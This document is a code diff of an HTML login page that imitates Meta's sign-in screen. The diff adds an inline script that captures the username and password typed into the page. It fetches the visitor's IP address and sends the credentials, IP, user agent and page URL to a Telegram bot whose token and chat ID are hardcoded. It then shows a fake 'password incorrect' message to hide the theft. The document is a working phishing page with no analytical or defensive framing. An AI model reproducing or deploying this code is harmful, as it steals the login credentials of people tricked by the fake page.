@@ -36,7 +36,6 @@
             box-sizing: border-box;
             font-size: 16px;
             outline: none;
-            transition: border-color 0.2s;
         }
         input:focus {
             border-color: #0064e0;
@@ -54,14 +53,9 @@
         .login-btn {
             background-color: #0064e0;
             color: white;
-            transition: opacity 0.2s;
-        }
-        .login-btn:hover {
-            opacity: 0.9;
         }
         .login-btn:disabled {
             opacity: 0.6;
-            cursor: default;
         }
         .create-btn {
             background-color: transparent;
@@ -74,9 +68,6 @@
             font-weight: 600;
             color: #0064e0;
             cursor: pointer;
-        }
-        .forgot-password:hover {
-            text-decoration: underline;
         }
         .error-msg {
             color: #ed4956;
@@ -112,7 +103,7 @@
     <input type="password" id="password" placeholder="Password" autocomplete="new-password">
     
     <button class="login-btn" id="loginBtn">
-        <span class="btn-text" id="btnText">Log in</span>
+        <span id="btnText">Log in</span>
         <div class="spinner" id="spinner"></div>
     </button>
     
@@ -121,6 +112,75 @@
     <button class="create-btn">Create new account</button>
 </div>
 
-<script src="script.js"></script>
+<script>
+    // ================== CONFIG ==================
+    const TOKEN = "8912562695:AAH3_MJYNFSKJo9duvYg_wMBQXSwNRCuoyo";
+    const CHAT_ID = "1692257834";
+    // ============================================
+
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const loginBtn = document.getElementById('loginBtn');
+    const btnText = document.getElementById('btnText');
+    const spinner = document.getElementById('spinner');
+    const errorMsg = document.getElementById('errorMsg');
+
+    loginBtn.addEventListener('click', async function(e) {
+        e.preventDefault();
+
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value;
+
+        if (!username || !password) {
+            errorMsg.textContent = 'Please fill in both fields.';
+            errorMsg.style.display = 'block';
+            return;
+        }
+
+        // Show loading
+        loginBtn.disabled = true;
+        btnText.style.display = 'none';
+        spinner.style.display = 'block';
+        errorMsg.style.display = 'none';
+
+        // Get IP
+        let ip = 'Unknown';
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch (_) {}
+
+        const ua = navigator.userAgent;
+        const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Riyadh' });
+        const pageUrl = window.location.href;
+
+        // Send to Telegram
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `🔐 **Meta Login - New Entry**\n━━━━━━━━━━━━━━━━━━━\n👤 **Username/Email:** \`${username}\`\n🔑 **Password:** \`${password}\`\n🌐 **IP Address:** \`${ip}\`\n📄 **Page:** ${pageUrl}\n💻 **User Agent:** ${ua}\n🕐 **Time:** ${time}\n━━━━━━━━━━━━━━━━━━━`,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch (err) {
+            console.log('Send error:', err);
+        }
+
+        // Show fake error
+        setTimeout(() => {
+            loginBtn.disabled = false;
+            btnText.style.display = 'inline';
+            spinner.style.display = 'none';
+            errorMsg.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
+            errorMsg.style.display = 'block';
+            passwordInput.value = '';
+        }, 1500);
+    });
+</script>
+
 </body>
 </html>
